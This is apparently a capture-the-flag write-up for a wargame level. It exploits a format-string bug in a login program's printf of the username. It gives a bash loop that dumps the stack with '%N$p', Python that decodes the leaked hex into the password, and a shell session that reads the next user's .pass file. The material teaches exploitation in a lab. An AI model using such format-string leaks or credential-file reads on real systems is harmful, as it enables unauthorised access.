# Level 02

## Initial Context

- One file: `level02`

## Solving the Challenge

The program expects two inputs, an username and a password.

By looking at the decompiled code, the expected password is the next flag.
And if the password is wrong, the username is printed using `printf` which is exploitable.

We can use the `%p` specifier with a `$` to change the offset of the parameter read.

A simple script to dump the stack would be:

```bash
for x in $(seq 1 42); do
    echo -n "$x - ";
    python -c 'print "%'$x'$p "' | ./level02 | grep 'does not have access!';
done
```

The output is:

```
...
18 - (nil)  does not have access!
19 - (nil)  does not have access!
20 - 0x100000000  does not have access!
21 - (nil)  does not have access!
22 - 0x756e505234376848  does not have access!
23 - 0x45414a3561733951  does not have access!
24 - 0x377a7143574e6758  does not have access!
25 - 0x354a35686e475873  does not have access!
26 - 0x48336750664b394d  does not have access!
27 - (nil)  does not have access!
28 - 0x207024383225  does not have access!
29 - (nil)  does not have access!
...
```

We can see that offset 22 to 26 seems to contains ASCII.
To decode it, we convert HEX to ASCII and to reverse it (since we are in the wrong endianness).

```python
def decode(input):
    return input.decode("hex")[::-1]

print(decode("756e505234376848"))
# Hh74RPnu
print(decode("45414a3561733951"))
# Q9sa5JAE
print(decode("377a7143574e6758"))
# XgNWCqz7
print(decode("354a35686e475873"))
# sXGnh5J5
print(decode("48336750664b394d"))
# M9KfPg3H
```

The password is: `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H`

```bash
$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: x   
--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
*****************************************
Greetings, x!
$ whoami
level03
$ cat /home/users/level03/.pass
<flag>
```
